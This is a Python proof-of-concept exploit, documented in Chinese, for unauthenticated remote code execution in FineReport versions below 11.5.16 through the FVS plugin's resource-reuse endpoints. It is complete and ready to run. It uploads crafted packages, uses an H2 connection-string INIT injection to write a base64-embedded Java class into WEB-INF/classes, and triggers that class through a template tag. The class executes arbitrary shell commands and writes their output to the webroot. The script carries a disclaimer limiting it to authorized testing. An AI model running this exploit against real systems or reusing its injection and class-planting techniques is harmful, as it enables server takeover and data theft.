#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FineReport FVS 插件未授权 RCE PoC —— 路线三：类文件投递 + 模板 XML 实例化（无重载、无 JSP）
=====================================================================================
配套: poc-h2.py(交互/植入) / poc-attach.py(附件投毒 web.xml) | 原理见 vulnerability-analysis.md §7
影响: FineReport < 11.5.16（FVS/Duchamp 复用资源链路，实验基线 11.5.15 + wysiwyg 插件 4.13.0）

链路（三步都是未授权的 上传 + apply，入口同为 tplPath=reportlets）:
  [1] 落地  附件层把类文件字节(.txt 后缀, 不查文件头)和命令文本写进 WEB-INF/logs/
  [2] 就位  H2 INIT: CALL FILE_WRITE(FILE_READ(源), 目标) 把它复制成 WEB-INF/classes/V.class
            （路径里的 classes 在 SQL 里拼出来, 躲开名字检查。这是全链唯一用到 H2 的一步）
  [3] 触发  导入一个 frm 模板包, 模板 XML 里写 <Layout class="V"/> —— FR 解析模板时按 class 属性
            newInstance(), V 的静态初始化块执行命令, 输出写到 webroot/vout.txt
  [4] 回显  GET /webroot/vout.txt。首行是一次性标记, 用来确认拿到的是本次的输出

不需要容器重载（新类按需加载）, 不改 web.xml, 不写 JSP。
第 [3] 步 apply 的返回里 applySuccess=false 属预期: V 在解析阶段已被实例化, 之后导入器才因
包里没有主实体映射而空指针, 不影响执行。

仅用于授权测试 / 自建靶场。禁止指向生产或他人资产。

条件: 目标为 Linux 或 Windows(命令分别经 /bin/sh -c、cmd /c 执行); FR 进程对 Tomcat 目录有写权限。
      第 [2] 步依赖 FVS 插件自带的 H2（装了插件即有）。

用法:
  python3 poc-class.py -t http://127.0.0.1:18081                  # 默认命令: id/hostname/date, 直接回显
  python3 poc-class.py -t http://127.0.0.1:18081 -c "cat /etc/passwd | head -3"
  python3 poc-class.py -t http://127.0.0.1:18081 --tomcat-home /opt/fr/tomcat   # 非 Docker 布局
说明: 同一目标可反复执行不同命令; 改了载荷源码重新编译后, 需目标重启才会加载新类。
      还原: 删除 WEB-INF/classes/V.class、WEB-INF/logs/v.txt、WEB-INF/logs/c.txt、webroot/vout.txt。

内嵌载荷 V.class 由文末 V_SOURCE 用 JDK 8 编译:
  javac -source 1.8 -target 1.8 V.java
"""
import argparse
import base64
import hashlib
import http.client
import io
import json
import os
import sys
import time
import urllib.parse
import zipfile

V_CLASS_B64 = (
    "yv66vgAAADQAzQcATwcAUAoAUQBSCgBTAFQKAFUAVgoAVwBYCgABAFkKAAEAWgcAWwgAXAoAAQBdCgABAF4KAF8AYAgAYQoACQBiCgAJAGMIAGQKAAkAZQoACQBmCgAJAGcIAGgKAGkAagoACQBrCABsCgAJAG0HAG4IAG8IAHAIAHEIAHIKABoAcwoAGgB0CgAaAHUHAHYKACIAdwoAeAB5CgB6AHsKACIAfAoAeAB9BwB+CgAoAHcKACgAfwgAgAoAKACBCgAJAIIKACIAgwoAIgCECACFBwCGCgBfAIcHAIgIAIkKAAkAigoAOQB3CQACAIsKAAIAjAcAjQEACHNraXBOZXh0AQABWgEAAmdvAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAE8HAFsHAI4HAG4HAI8HAHYHAJAHAJEHAIgBAAY8aW5pdD4HAFABAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAZWLmphdmEBAAxqYXZhL2lvL0ZpbGUBAAFWBwCSDACTAJQHAJUMAJYAlwcAmAwAmQCaBwCbDACcAJ0MAEoAngwAnwCgAQAQamF2YS9sYW5nL1N0cmluZwEACmxvZ3MvYy50eHQMAEoAoQwAogCjBwCkDAClAKYBAAVVVEYtOAwASgCnDACoAKkBAAAMAKoAqwwArACtDACqAK4BAAdvcy5uYW1lBwCvDACwALEMALIArQEAA3dpbgwAswC0AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQADY21kAQACL2MBAAcvYmluL3NoAQACLWMMAEoAtQwAtgC3DAC4ALkBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwASgA9BwCPDAC6ALsHAJEMALwAvQwAvgC/DADAAMEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAwgDDAQABCgwAxACtDADFAMYMAL4AxwwAyADJAQAIdm91dC50eHQBABhqYXZhL25pby9maWxlL09wZW5PcHRpb24MAL4AygEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAh2ZXJyLnR4dAwAywDMDAA6ADsMADwAPQEAEGphdmEvbGFuZy9PYmplY3QBABNbTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1Byb2Nlc3MBAAJbQgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAA9qYXZhL2xhbmcvQ2xhc3MBABNnZXRQcm90ZWN0aW9uRG9tYWluAQAiKClMamF2YS9zZWN1cml0eS9Qcm90ZWN0aW9uRG9tYWluOwEAHmphdmEvc2VjdXJpdHkvUHJvdGVjdGlvbkRvbWFpbgEADWdldENvZGVTb3VyY2UBABwoKUxqYXZhL3NlY3VyaXR5L0NvZGVTb3VyY2U7AQAYamF2YS9zZWN1cml0eS9Db2RlU291cmNlAQALZ2V0TG9jYXRpb24BABAoKUxqYXZhL25ldC9VUkw7AQAMamF2YS9uZXQvVVJMAQAFdG9VUkkBABAoKUxqYXZhL25ldC9VUkk7AQARKExqYXZhL25ldC9VUkk7KVYBAA1nZXRQYXJlbnRGaWxlAQAQKClMamF2YS9pby9GaWxlOwEAIyhMamF2YS9pby9GaWxlO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAGdG9QYXRoAQAWKClMamF2YS9uaW8vZmlsZS9QYXRoOwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAxyZWFkQWxsQnl0ZXMBABgoTGphdmEvbmlvL2ZpbGUvUGF0aDspW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAB2luZGV4T2YBAAQoSSlJAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABHRyaW0BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBABNyZWRpcmVjdEVycm9yU3RyZWFtAQAdKFopTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAd3YWl0Rm9yAQADKClJAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAUoW0IpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEARyhMamF2YS9uaW8vZmlsZS9QYXRoO1tCW0xqYXZhL25pby9maWxlL09wZW5PcHRpb247KUxqYXZhL25pby9maWxlL1BhdGg7AQAHdmFsdWVPZgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7ACEAAgA5AAAAAQAIADoAOwAAAAMACgA8AD0AAQA+AAACwwAGAA4AAAFvAUu7AAFZEgK2AAO2AAS2AAW2AAa3AAdLKrYACEy7AAlZuwABWSsSCrcAC7YADLgADRIOtwAPTSwQCrYAED4dnAAIEhGnAAwsAx22ABK2ABM6BB2cAAcspwAKLB0EYLYAFDoFEhUSEbgAFrYAFxIYtgAZNga7ABpZFQaZABkGvQAJWQMSG1NZBBIcU1kFGQVTpwAWBr0ACVkDEh1TWQQSHlNZBRkFU7cAHzoHGQcEtgAgVxkHtgAhOgi7ACJZtwAjOgkREAC8CDoKGQi2ACQ6DBkMGQq2ACVZNgueABAZCRkKAxULtgAmp//pGQi2ACdXuwAiWbcAIzoNGQ27AChZtwApGQS2ACoSK7YAKrYALBIOtgAttgAuGQ0ZCbYAL7YALrsAAVkrtgAIEjC3AAu2AAwZDbYALwO9ADG4ADJXpwAwTCrGACe7AAFZKrYACLYACBI0twALtgAMK7gANRIOtgAtA70AMbgAMlenAARNsQACAAIBPgFBADMBQgFqAW0AMwACAD8AAABiABgAAAAGAAIACAAYAAkAHQAKADcACwA+AAwAUgANAGMADgB0AA8AqwAQALIAEQC5ABIAwgATAMkAFQDQABYA6gAXAPAAGAD5ABkBFwAaASEAGwE+AB4BQQAcAUIAHQFuAB8AQAAAAMoADP8ARwAEBwBBBwBBBwBCAQAASAcAQvwACQcAQkYHAEL/ADEABwcAQQcAQQcAQgEHAEIHAEIBAAIIAHQIAHT/ABIABwcAQQcAQQcAQgEHAEIHAEIBAAMIAHQIAHQHAEP/ACkADQcAQQcAQQcAQgEHAEIHAEIBBwBEBwBFBwBGBwBHAAcASAAA/wAZAA0HAEEHAEEHAEIBBwBCBwBCAQcARAcARQcARgcARwEHAEgAAP8AVgABBwBBAAEHAEn8ACgHAElCBwBJ+gAAAAEASgA9AAEAPgAAAEAAAQABAAAAFSq3ADayADeZAAoDswA3pwAGuAA4sQAAAAIAPwAAAAYAAQAAACIAQAAAAA0AAv8AEQABBwBLAAACAAgATAA9AAEAPgAAACAAAQAAAAAACLgAOASzADexAAAAAQA/AAAABgABAAAAIQABAE0AAAACAE4=")
V_CLASS_SHA256 = "44a850910c3b57ba6e76bf58e9708db79eb91813c762333f19b647aa071b856c"

INFO_XML = ('<?xml version="1.0" encoding="UTF-8"?>\n<ITEM>\n<structureVersion>2.0</structureVersion>\n'
            '<name>p</name>\n<entityType>fvs</entityType>\n<envVersion>11.0</envVersion>\n</ITEM>\n')
TRIGGER_XML = (b'<?xml version="1.0" encoding="UTF-8"?>'
               b'<Form class="com.fr.form.main.Form"><Layout class="V"/></Form>')


def build_pack(attachments=(), h2=False, frm_entity=None):
    """复用包(zip)。
    attachments: [(内容, 相对 WEB-INF 的落地路径)] —— 附件层, 后缀走白名单(.txt 不查文件头)
    h2:          DataLayer 带 example_db_depend_key —— 让导入流程去打开 H2 连接(props.name 即注入)
    frm_entity:  (包内文件名, 模板 XML 字节) —— type=3 的 frm 实体, 导入时会被解析"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("resource/info.xml", INFO_XML)
        z.writestr("content/data/DataLayer.json",
                   '{"tableInfos":[],"staticInfos":[],"attachInfos":[]'
                   + (',"extraAttributes":{"example_db_depend_key":"1"}' if h2 else '') + '}')
        if h2:
            z.writestr("content/data/appdata.mv.db", b"POCDUMMY" * 4)
        if not frm_entity:   # 附件包 / H2 包: 带一个不参与导入的占位实体(type 99), 让导入正常收尾
            z.writestr("content/biz/BizLayer.json",
                       '{"entityMappings":[{"uuid":"e1","id":"reportlets/p/main.fvs"}],"staticInfos":[],"attachInfos":[]}')
            z.writestr("content/biz/e1/bizEntityInfo.json", '{"id":"e1","type":99}')
        infos = []
        for i, (content, origin) in enumerate(attachments):
            z.writestr("content/biz/attachments/a%d" % i, content)
            infos.append({"exportPath": "a%d" % i, "originPath": origin})
        if infos:
            z.writestr("content/biz/attachments/AttachmentLayer.json",
                       json.dumps({"attachInfos": infos, "staticInfos": []}))
        if frm_entity:
            fname, xml = frm_entity
            mapping = json.dumps({"originPath": "x.frm", "exportPath": fname})
            z.writestr("content/biz/BizLayer.json",
                       json.dumps({"entityMappings": [{"uuid": "e1", "id": "reportlets/p/main.fvs"}],
                                   "staticInfos": [], "attachInfos": []}))
            z.writestr("content/biz/e1/bizEntityInfo.json",
                       json.dumps({"id": "e1", "type": 3,
                                   "details": {"ReportletMappingBean": mapping}}))
            z.writestr("content/biz/e1/" + fname, xml)
    return buf.getvalue()


def http_req(urlp, method="GET", body=None, ctype=None, timeout=60):
    conn = http.client.HTTPConnection(urlp.hostname, urlp.port or 80, timeout=timeout)
    target = urlp.path + (("?" + urlp.query) if urlp.query else "")
    conn.request(method, target, body=body, headers={"Content-Type": ctype} if ctype else {})
    r = conn.getresponse()
    data = r.read()
    conn.close()
    return r.status, data


def send(base, name, pkg, apply_path="pocout"):
    """一组 未授权上传 + apply。返回 (上传状态码, 复用条目 id, apply 状态码, apply 响应片段)"""
    props = json.dumps({"name": name, "structureVersion": "2.0", "envVersion": "11.0"})
    qs = ("tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props="
          + urllib.parse.quote(props, safe=""))
    b = "----poc114516"
    body = (f"--{b}\r\n".encode()
            + b'Content-Disposition: form-data; name="file"; filename="p.mfvs"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n" + pkg
            + f"\r\n--{b}--\r\n".encode())
    st, data = http_req(urllib.parse.urlsplit(base + "/view/duchamp/reuse/item?" + qs), "POST", body,
                    f"multipart/form-data; boundary={b}")
    try:
        rid = json.loads(data).get("id", "")
    except Exception:
        rid = ""
    if not rid:
        return st, "", 0, data[:200].decode("utf-8", "replace")
    q = urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": apply_path})
    try:
        st2, d2 = http_req(urllib.parse.urlsplit(base + "/view/duchamp/reuse/apply/v2/tpl?" + q), "POST", b"",
                       timeout=180)
    except Exception as e:
        return st, rid, 0, str(e)
    return st, rid, st2, d2[:120].decode("utf-8", "replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--target", required=True, help="引擎基址, 如 http://ip:18081")
    ap.add_argument("-c", "--cmd", default=None, help="要执行的命令(默认: id; hostname; date)")
    ap.add_argument("--tomcat-home", default="/usr/local/tomcat", help="目标 Tomcat 根目录")
    a = ap.parse_args()

    v = base64.b64decode(V_CLASS_B64)
    if hashlib.sha256(v).hexdigest() != V_CLASS_SHA256:
        sys.exit("内置的 V.class 校验失败, 文件已损坏")
    base = a.target.rstrip("/") + "/webroot/decision"
    o = urllib.parse.urlsplit(a.target)
    origin = f"{o.scheme}://{o.netloc}"
    web_inf = a.tomcat_home.rstrip("/") + "/webapps/webroot/WEB-INF"
    tag = "PWN-CLASS-" + os.urandom(6).hex()
    cmd = a.cmd or "echo PWN-CLASS-LOAD; id; hostname; date"
    print(f"[*] target={a.target}  V.class={len(v)}B  tag={tag}")

    # 1) 落地: 类文件字节 + 命令
    st, rid, st2, t = send(base, "clsstage",
                           build_pack([(v, "logs/v.txt"), (f"{tag}\n{cmd}".encode("utf-8"), "logs/c.txt")]))
    print(f"[1] 落地   -> upload {st} / apply {st2} {t}")
    if not rid:
        sys.exit("上传失败(见上)。常见原因: 目标没装 FVS 插件, 或容器刚重启插件未就绪")

    # 2) 就位: H2 把 logs/v.txt 复制成 classes/V.class（全链唯一用到 H2 的一步）
    name = ("x;INIT=CALL FILE_WRITE(FILE_READ('{w}/logs/v.txt'),"
            "CONCAT('{w}/cl','asses/V.class'))--").format(w=web_inf)
    st, rid, st2, t = send(base, name, build_pack(h2=True))
    print(f"[2] 就位   -> upload {st} / apply {st2} {t}")
    if not rid or st2 != 200:
        sys.exit("复制失败。确认 --tomcat-home 指向目标 Tomcat 根目录")

    # 3) 触发: frm 模板 <Layout class="V"/> → FR 解析时实例化 V
    st, rid, st2, t = send(base, "clstrig", build_pack(frm_entity=("a", TRIGGER_XML)), "clstrig")
    print(f"[3] 触发   -> upload {st} / apply {st2} {t}")

    # 4) 回显: 读 vout.txt, 核对一次性标记
    out_url = urllib.parse.urlsplit(origin + "/webroot/vout.txt")
    for _ in range(5):
        try:
            st, data = http_req(out_url, timeout=10)
        except Exception as e:
            sys.exit(f"回显请求异常: {e}")
        lines = data.split(b"\n", 1)
        if st == 200 and lines and lines[0].decode("utf-8", "replace").strip() == tag:
            print(f"[4] 回显   -> {st}  (命令以应用进程权限执行, 输出如下)")
            print("-" * 46)
            print((lines[1] if len(lines) > 1 else b"").decode("utf-8", "replace").strip())
            print("-" * 46)
            return
        time.sleep(2)
    sys.exit("未拿到本次输出: 标记不匹配。V 可能没被实例化(确认目标装有 FVS 插件且版本受影响)")


# 载荷源码（与上方 V.class 对应）。放到 WEB-INF/classes 后被 FR 实例化：
#   读 WEB-INF/logs/c.txt（首行=一次性标记, 其余=命令）→ 执行 → 把 标记+输出 写到 webroot/vout.txt
V_SOURCE = r"""import java.io.*;
import java.nio.file.*;

public class V {
    private static void go() {
        File classes = null;
        try {
            classes = new File(V.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File webinf = classes.getParentFile();
            String spec = new String(Files.readAllBytes(new File(webinf, "logs/c.txt").toPath()), "UTF-8");
            int nl = spec.indexOf(10);
            String tag = nl < 0 ? "" : spec.substring(0, nl).trim();
            String cmd = nl < 0 ? spec : spec.substring(nl + 1);
            boolean win = System.getProperty("os.name", "").toLowerCase().contains("win");
            ProcessBuilder pb = new ProcessBuilder(win ? new String[]{"cmd", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd});
            pb.redirectErrorStream(true);
            Process p = pb.start();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] b = new byte[4096];
            int n;
            InputStream in = p.getInputStream();
            while ((n = in.read(b)) > 0) bo.write(b, 0, n);
            p.waitFor();
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            out.write((tag + "\n").getBytes("UTF-8"));
            out.write(bo.toByteArray());
            Files.write(new File(webinf.getParentFile(), "vout.txt").toPath(), out.toByteArray());
        } catch (Throwable e) {
            try { if (classes != null) Files.write(new File(classes.getParentFile().getParentFile(), "verr.txt").toPath(), String.valueOf(e).getBytes("UTF-8")); } catch (Throwable ignore) {}
        }
    }
    static boolean skipNext;
    static { go(); skipNext = true; }
    public V() { if (skipNext) { skipNext = false; } else { go(); } }
}"""

if __name__ == "__main__":
    main()
